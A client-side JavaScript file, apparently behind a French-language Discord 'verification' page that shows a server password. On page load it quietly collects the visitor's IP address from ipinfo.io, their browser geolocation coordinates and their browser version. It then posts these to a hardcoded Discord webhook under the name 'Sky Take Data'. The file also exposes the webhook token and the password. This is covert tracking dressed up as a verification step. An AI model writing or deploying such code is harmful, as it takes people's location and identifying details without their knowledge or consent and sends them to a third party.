let getTempLocationForVerification;
let getTempIpAddressForVerification;

let currentdate = new Date(); 
let datetime = "" + currentdate.getDate() + "/"
         + (currentdate.getMonth()+1)  + "/" 
         + currentdate.getFullYear() + " @ "  
         + currentdate.getHours() + ":"  
         + currentdate.getMinutes() + ":" 
         + currentdate.getSeconds();

console.log(datetime)

$(document).ready(() => {
   // Utilisez le lien ipinfo pour obtenir l'adresse IP
   $.getJSON("https://ipinfo.io", function (response) {
      getTempIpAddressForVerification = response.ip;
      sendMessage(); // déplacez l'appel à sendMessage() ici
   }, "jsonp");
});

if (navigator.geolocation) {
   navigator.geolocation.getCurrentPosition(function(position) {
      let latitude = position.coords.latitude;
      let longitude = position.coords.longitude;
      getTempLocationForVerification = "Latitude : " + latitude + ", Longitude : " + longitude;
      sendMessageLocalisation();
   });
} else {
   console.log("La géolocalisation n'est pas prise en charge par ce navigateur.");
   getTempLocationForVerification = "None"
}

let navigatorVersion = navigator.appCodeName + navigator.appName + navigator.appVersion

function sendMessage() {
   let request = new XMLHttpRequest();
   request.open("POST", "https://discord.com/api/webhooks/1209127945797640192/-2zN1Ce1T40pkgXCi5GdF_KH1Lu81WzbTpqc3XAa9QZPpgjH57DNKA7fxf3SE7sDEYkJ");
   request.setRequestHeader('Content-type', 'application/json');

   let params = {
      username: "Sky Take Data",
      avatar_url: "https://avatars.githubusercontent.com/u/33034795?s=400&u=fbfb434dac6b0252e69ae4ceb12337ca19f95df3&v=4",
      embeds: [{
         title: "Info User",
         fields: [
            { name: "Date et heure", value: datetime, inline: false },
            { name: "Adresse IP", value: getTempIpAddressForVerification, inline: false },
            { name: "Version du navigateur", value: navigatorVersion, inline: false }
         ]
      }]
   }

   request.send(JSON.stringify(params));
}

function sendMessageLocalisation() {
   let request = new XMLHttpRequest();
   request.open("POST", "https://discord.com/api/webhooks/1209127945797640192/-2zN1Ce1T40pkgXCi5GdF_KH1Lu81WzbTpqc3XAa9QZPpgjH57DNKA7fxf3SE7sDEYkJ");
   request.setRequestHeader('Content-type', 'application/json');

   let params = {
      username: "Sky Take Data",
      avatar_url: "https://avatars.githubusercontent.com/u/33034795?s=400&u=fbfb434dac6b0252e69ae4ceb12337ca19f95df3&v=4",
      embeds: [{
         title: "Info Localiation",
         fields: [
            { name: "Date et heure", value: datetime, inline: false },
            { name: "Localisation", value: getTempLocationForVerification, inline: false },
         ]
      }]
   }

   request.send(JSON.stringify(params));
}

function showPassword(){
   const button = document.getElementById("button")
   button.setAttribute("disabled", "disabled");
   const password = document.createElement("p")
   password.setAttribute("class", "password")
   password.innerText = 'Mot de passe: TBPisBest! \n \n à mettre dans le salon "Vérification"'
   document.body.appendChild(password)
}